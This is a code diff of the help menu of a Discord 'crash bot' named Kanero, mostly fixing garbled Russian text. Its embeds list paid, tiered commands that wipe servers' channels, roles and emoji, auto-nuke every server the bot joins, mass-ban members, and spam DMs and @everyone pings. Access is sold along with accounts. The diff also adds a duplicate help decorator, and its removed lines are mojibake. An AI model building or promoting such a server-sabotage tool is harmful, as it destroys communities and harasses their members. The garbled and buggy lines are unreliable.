@@ -4568,6 +4568,7 @@ async def changelogall(ctx):
 
 
 @bot.command(name="help")
+@bot.command(name="help")
 async def help_cmd(ctx):
     uid = ctx.author.id
     is_owner = (uid == config.OWNER_ID)
@@ -4576,14 +4577,14 @@ async def help_cmd(ctx):
     is_fl = is_freelisted(uid)
 
     embed = discord.Embed(
-        title="?? Kanero � CRASH BOT",
+        title="☠️ Kanero – CRASH BOT",
         description=(
             "```\n"
-            "  ------�------�  -----� -------�--�  --�\n"
-            " --�====---�==--�--�==--�--�====---�  --�\n"
-            " --�     ------�--------�-------�-------�\n"
-            " --�     --�==--�--�==--�L====--�--�==--�\n"
-            " L------�--�  --�--�  --�-------�--�  --�\n"
+            "  ------◆------◆  -----◆ -------◆--◆  --◆\n"
+            " --◆====---◆==--◆--◆==--◆--◆====---◆  --◆\n"
+            " --◆     ------◆--------◆-------◆-------◆\n"
+            " --◆     --◆==--◆--◆==--◆L====--◆--◆==--◆\n"
+            " L------◆--◆  --◆--◆  --◆-------◆--◆  --◆\n"
             "  L=====-L=-  L=-L=-  L=-L======-L=-  L=-\n"
             "```"
         ),
@@ -4591,226 +4592,106 @@ async def help_cmd(ctx):
     )
 
     if is_owner:
-        access_str = "?? **OWNER** � ������ ������"
+        access_str = "👑 **OWNER** – полный доступ"
     elif is_prem:
-        access_str = "?? **PREMIUM** � ����������� ������"
+        access_str = "💎 **PREMIUM** – расширенные команды"
     elif is_wl:
-        access_str = "? **Whitelist** � ������� �������"
+        access_str = "✅ **Whitelist** – базовые команды"
     elif is_freelisted(uid):
-        access_str = "?? **Freelist** � ������� ������ (������� � #addbot)"
+        access_str = "👥 **Freelist** – базовые команды (напиши в #addbot)"
     else:
-        access_str = "? **��� �������** � ������ � #addbot �� ����� �������: https://discord.gg/nNTB37QNCG"
+        access_str = "❌ **Нет доступа** – напиши в #addbot по ссылке сервера: https://discord.gg/nNTB37QNCG"
 
-    embed.add_field(name="?? ���� �������", value=access_str, inline=False)
+    embed.add_field(name="🔑 Твой уровень", value=access_str, inline=False)
 
     embed.add_field(
-        name="?? FREELIST (������ � #addbot � ���������)",
+        name="👥 FREELIST (напиши в #addbot и получишь)",
         value=(
-            "`!nuke` � ���� (�������������� > ���� > ������ > ���� > ���� ??)\n"
-            "`!auto_nuke on/off/info` � ����-���� ��� ����� ����\n"
-            "`!help` � ��� ����\n"
-            "`!changelog` � ��������� ����������\n"
-            "`!changelogall` � ��� �������"
+            "`!nuke` – нук сервера (удаляет каналы > роли > эмодзи > стикеры > баны)\n"
+            "`!auto_nuke on/off/info` – авто-нук для каждого входа\n"
+            "`!help` – эта справка\n"
+            "`!changelog` – история обновлений\n"
+            "`!changelogall` – все обновления"
         ),
         inline=False
     )
 
     embed.add_field(
-        name="? WHITELIST",
+        name="✅ WHITELIST",
         value=(
-            "`!nuke [�����]` � ��� �� ����� �������\n"
-            "`!stop` � ���������� ����\n"
-            "`!cleanup` � ������ ��, �������� ���� �����\n"
-            "`!rename [��������]` � ������������� ������\n"
-            "`!nicks_all [���]` � ������� ���� ����\n"
-            "`!webhooks` � ������ ��������\n"
-            "`!inv` � ������ ��� ���������� ����"
+            "`!nuke [текст]` – нук со своим спамом\n"
+            "`!stop` – остановить нук\n"
+            "`!cleanup` – удалить ботов, оставить только людей\n"
+            "`!rename [название]` – переименовать сервер\n"
+            "`!nicks_all [ник]` – изменить ники всем\n"
+            "`!webhooks` – список вебхуков\n"
+            "`!inv` – ссылка для приглашения бота"
         ),
         inline=False
     )
 
     embed.add_field(
-        name="?? PREMIUM",
+        name="💎 PREMIUM",
         value=(
-            "`!nuke [�����]` � ��� � ��������� �������\n"
-            "`!super_nuke [�����]` � ���, �� 15 ���������� + ���� ??\n"
-            "`!auto_super_nuke on/off/text/info` � ���� super_nuke ��� �����\n"
-            "`!auto_superpr_nuke on/off/text/info` � ���� ����� ��� ��� �����\n"
-            "`!massban` � `!massdm` � `!spam` � `!pingspam`\n"
-            "`!rolesdelete` � `!serverinfo` � `!userinfo`"
+            "`!nuke [текст]` – нук с расширенным спамом\n"
+            "`!super_nuke [текст]` – нук, но 15 сообщений + спам 💎\n"
+            "`!auto_super_nuke on/off/text/info` – авто super_nuke для входов\n"
+            "`!auto_superpr_nuke on/off/text/info` – авто нук всех входов\n"
+            "`!massban` – `!massdm` – `!spam` – `!pingspam`\n"
+            "`!rolesdelete` – `!serverinfo` – `!userinfo`"
         ),
         inline=False
     )
 
     embed.add_field(
-        name="?? TESTER",
+        name="🧪 TESTER",
         value=(
-            "����������� ������ ��� ������������ ����� �������\n"
-            "����� Premium + ������ � ��������� TESTS\n"
-            "������: ???bug-reports � ???testing � ??test-results"
+            "Специальная роль для тестирования новых функций\n"
+            "Доступ: Premium + каналы в категории TESTS\n"
+            "Каналы: 🐛・bug-reports – 🧪・testing – ✅・test-results"
         ),
         inline=False
     )
 
     if is_owner:
         embed.add_field(
-            name="?? OWNER",
+            name="👑 OWNER",
             value=(
-                "`!owner_nuke [�����]` � ������ ��� + ���� ??\n"
-                "`!auto_owner_nuke on/off/text/info` � ���� owner ���\n"
-                "`!auto_off` � ��������� ��� ���� ����\n"
-                "`!auto_info` � ������ ���� ���� �����\n"
-                "`!wl_add/remove/list` � `!pm_add/remove/list`\n"
-                "`!fl_add/remove/list/clear` � freelist\n"
-                "`!tester_add/remove/list` � ���������� ���������\n"
-                "`!on_add/remove/list` � owner nuke list\n"
-                "`!����������� <���> <�����>` � �������� ����������� � �������\n"
-                "`!announce_bug \"��������\" ��������` � �������� � ����\n"
-                "`!list` � `!list_clear` � `!sync_roles` � ������������� �����\n"
-                "`!autorole` � ������ ����-����\n"
+                "`!owner_nuke [текст]` – ядерный нук + спам 👑\n"
+                "`!auto_owner_nuke on/off/text/info` – авто owner нук\n"
+                "`!auto_off` – отключить все авто нуки\n"
+                "`!auto_info` – показать все авто нуки\n"
+                "`!wl_add/remove/list` – `!pm_add/remove/list`\n"
+                "`!fl_add/remove/list/clear` – freelist\n"
+                "`!tester_add/remove/list` – управление тестерами\n"
+                "`!on_add/remove/list` – owner nuke list\n"
+                "`!compensate <тип> <часы>` – выдать компенсацию в чате\n"
+                "`!announce_bug \"название\" описание` – объявить о баге\n"
+                "`!list` – `!list_clear` – `!sync_roles` – синхронизация ролей\n"
+                "`!autorole` – авто-роль при входе\n"
                 "`!block_guild/unblock_guild`\n"
-                "`!setup` � `!setup_update` � ��������� �������\n"
-                "`!goout` � `!nukelogs` � `!roles` � `!giverole`\n"
-                "`!unban <id>` � `!guilds` � `!setguild` � `!invlink`"
+                "`!setup` – `!setup_update` – создание каналов\n"
+                "`!goout` – `!nukelogs` – `!roles` – `!giverole`\n"
+                "`!unban <id>` – `!guilds` – `!setguild` – `!invlink`"
             ),
             inline=False
         )
 
     embed.add_field(
-        name="?? ������ ��������",
+        name="🛍️ Способы получить",
         value=(
             "**White / Premium:**\n"
-            "������� � ������ �� ����� �������:\n"
-            "???sell � ������� ��������\n"
-            "???������-����� � ���� ������\n\n"
-            "**��� ������:** https://discord.gg/nNTB37QNCG"
+            "Купить у владельца на одном из сайтов:\n"
+            "🛒・sell – продажа аккаунтов\n"
+            "💰・прайс-лист – цены услуг\n\n"
+            "**Наш сервер:** https://discord.gg/nNTB37QNCG"
         ),
         inline=False
     )
-    embed.set_footer(text="?? Kanero  |  !changelogall � ��� �������  |  v2.5")
+    embed.set_footer(text="☠️ Kanero  |  !changelogall – все обновления  |  v2.5")
     embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
     await ctx.send(embed=embed)
 
-
-
-@bot.command(name="commands_user")
-@wl_check()
-async def commands_user(ctx):
-    embed = discord.Embed(
-        title="??? ������� � ������� ������������",
-        color=0x0a0a0a
-    )
-    embed.add_field(
-        name="?? �����������",
-        value=(
-            "`!nuke` � �������������� > �������� ����� > ������ > ���� > ���� ??\n"
-            "`!stop` � ���������� ����\n"
-            "`!cleanup` � ������ ��, �������� ���� �����\n"
-            "`!auto_nuke on/off/info` � ����-���� ��� ����� ����"
-        ),
-        inline=False
-    )
-    embed.add_field(
-        name="? ��������",
-        value=(
-            "`!rename [��������]` � ������������� ��� ������\n"
-            "`!nicks_all [���]` � ������� ���� ����\n"
-            "`!webhooks` � ������ ��������"
-        ),
-        inline=False
-    )
-    embed.add_field(
-        name="?? �������",
-        value=(
-            "`!inv` � ������ ��� ���������� ����\n"
-            "`/sp [���-��] [�����]` � ����\n"
-            "`/spkd [��������] [���-��] [�����]` � ���� � ���������\n"
-            "`!changelog` � ������� ����������"
-        ),
-        inline=False
-    )
-    embed.set_footer(text="?? Kanero  |  davaidkatt")
-    await ctx.send(embed=embed)
-
-
-@bot.command(name="commands_premium")
-@wl_check()
-async def commands_premium(ctx):
-    embed = discord.Embed(
-        title="?? ������� � PREMIUM",
-        description="�������� ������ Premium �������������. ������: **davaidkatt**",
-        color=0x0a0a0a
-    )
-    embed.add_field(
-        name="?? �����������",
-        value=(
-            "`!nuke [�����]` � ��� �� ����� �������\n"
-            "`!super_nuke [�����]` � ��� �� ������������\n"
-            "`!massban` � �������� ���� ����������\n"
-            "`!rolesdelete` � ������� ��� ����\n"
-            "`!auto_super_nuke on/off/text/info` � ���� ��� ��� �����\n"
-            "`!auto_superpr_nuke on/off/text/info` � ���� ����� ��� ��� �����"
-        ),
-        inline=False
-    )
-    embed.add_field(
-        name="?? ����",
-        value=(
-            "`!massdm [�����]` � ��������� �� ���� ����������\n"
-            "`!spam [���-��] [�����]` � ���� � �����\n"
-            "`!pingspam [���-��]` � ���� @everyone"
-        ),
-        inline=False
-    )
-    embed.add_field(
-        name="?? ����",
-        value=(
-            "`!serverinfo` � ��������� ���� � �������\n"
-            "`!userinfo [id]` � ���� � ������������"
-        ),
-        inline=False
-    )
-    embed.set_footer(text="?? Kanero  |  davaidkatt")
-    await ctx.send(embed=embed)
-
-
-@bot.command(name="commands_owner")
-async def commands_owner(ctx):
-    if ctx.author.id != config.OWNER_ID:
-        return
-    embed = discord.Embed(
-        title="?? ������� � OWNER",
-        description="������ ��� ������ ����.",
-        color=0x0a0a0a
-    )
-    embed.add_field(
-        name="?? WHITELIST",
-        value=(
-            "`!wl_add <id>` � ������ ������ � ����\n"
-            "`!wl_remove <id>` � ������� ������\n"
-            "`!wl_list` � ������ �������������"
-        ),
-        inline=False
-    )
-    embed.add_field(
-        name="?? PREMIUM",
-        value=(
-            "`!pm_add <id>` � ������ Premium\n"
-            "`!pm_remove <id>` � ������� Premium\n"
-            "`!pm_list` � ������ Premium"
-        ),
-        inline=False
-    )
-    embed.add_field(
-        name="?? ����������",
-        value=(
-            "`!block_guild <id>` � ������������� ������\n"
-            "`!unblock_guild <id>` � ��������������\n"
-            "`!blocked_guilds` � ������ ���������������"
-        ),
-        inline=False
-    )
-    embed.add_field(
         name="?? ���������",
         value=(
             "`!set_spam_text <�����>` � ������� ��������� ����� ����\n"
